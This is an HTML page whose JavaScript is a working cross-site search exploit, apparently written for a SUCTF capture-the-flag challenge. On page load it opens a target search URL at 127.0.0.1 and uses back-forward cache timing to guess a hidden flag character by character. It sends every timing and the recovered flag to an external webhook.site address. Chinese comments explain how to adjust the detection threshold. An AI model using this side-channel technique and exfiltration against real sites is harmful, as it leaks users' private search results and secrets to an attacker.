<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BFCache XS-Search</title>
</head>
<body>
    <h2>XS-Search 正在运行... 请查看你的 Webhook。</h2>

    <script>
        // ================= 配置区域 =================
        const TARGET = "http://127.0.0.1/search.php?q=";
        const WEBHOOK = "https://webhook.site/c8c16a87-5b68-43f5-8b20-57cb7cd2ba7";
        
        // 【自动识别】获取当前网页所在的目录 (例如: https://xxx.github.io/repo)
        const ATTACKER_SERVER = window.location.href.substring(0, window.location.href.lastIndexOf('/'));
        // ============================================

        let flag = "SUCTF{";
        const charset = ['0', '1', '}']; // Flag 只包含 0 和 1

        const sleep = ms => new Promise(r => setTimeout(r, ms));

        function sendLog(msg) {
            fetch(`${WEBHOOK}?log=${encodeURIComponent(msg)}`, { mode: 'no-cors' }).catch(() => {});
        }

        async function measureTiming(url) {
            return new Promise(async (resolve) => {
                let win = window.open(url, "exploit_win");
                await sleep(1000); // 等待目标页面加载

                // 跳转到同目录下的 dummy.html
                win.location = ATTACKER_SERVER + "/dummy.html";

                // 确认 dummy 加载完毕
                while (true) {
                    try { if (win.dummyLoaded) break; } catch (e) { }
                    await sleep(50);
                }
                
                await sleep(200);

                // 开始计时并后退
                let start = performance.now();
                win.history.back();

                // 轮询检测跨域退回 127.0.0.1
                let timer = setInterval(() => {
                    try {
                        let currentHref = win.location.href;
                    } catch (e) {
                        let end = performance.now();
                        clearInterval(timer);
                        win.close();
                        resolve(end - start);
                    }
                }, 1);
            });
        }

        async function runExploit() {
            sendLog("[START] 开始进行 BFCache 侧信道爆破，目标所在域: " + ATTACKER_SERVER);

            while (!flag.endsWith('}')) {
                let foundMatch = false;

                for (let c of charset) {
                    let guess = flag + c;
                    let time = await measureTiming(TARGET + guess);
                    sendLog(`[TIME] 测得耗时: ${time.toFixed(2)} ms (测试内容: ${guess})`);

                    // 【阈值判断】如果耗时小于 20ms，说明命中了 BFCache (即搜索到了 Flag)
                    // 如果 Webhook 里的日志显示误判，你需要修改这里的 20
                    if (time < 20) { 
                        flag = guess;
                        sendLog(`[SUCCESS] 发现正确字符！当前 Flag: ${flag}`);
                        foundMatch = true;
                        break;
                    }
                }

                if (!foundMatch) {
                    sendLog("[ERROR] 探测中断。如果 0 和 1 的耗时都在 20ms 以上，请修改代码中的判断阈值！");
                    break;
                }
            }
            sendLog(`[FINISHED] 最终获取到的 Flag: ${flag}`);
        }

        window.onload = () => {
            setTimeout(runExploit, 1000);
        };
    </script>
</body>
</html>
